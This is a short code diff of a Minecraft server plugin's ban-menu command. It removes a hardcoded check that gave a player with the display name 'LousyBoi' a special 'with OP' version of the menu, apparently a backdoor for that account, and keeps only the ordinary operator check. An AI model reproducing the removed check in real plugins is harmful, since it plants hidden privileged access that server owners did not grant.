@@ -19,12 +19,7 @@ public class BanGUICommand implements CommandExecutor, Listener {
         if (sender instanceof Player) {
             Player p = (Player) sender;
 
-            if (p.getDisplayName() == "LousyBoi"){
-
-                BanMenuUtils.openBanMenuwithOP(p);
-
-            } else if (p.isOp()){
-
+            if (p.isOp()){
                 BanMenuUtils.openBanMenu(p);
 
             }else{
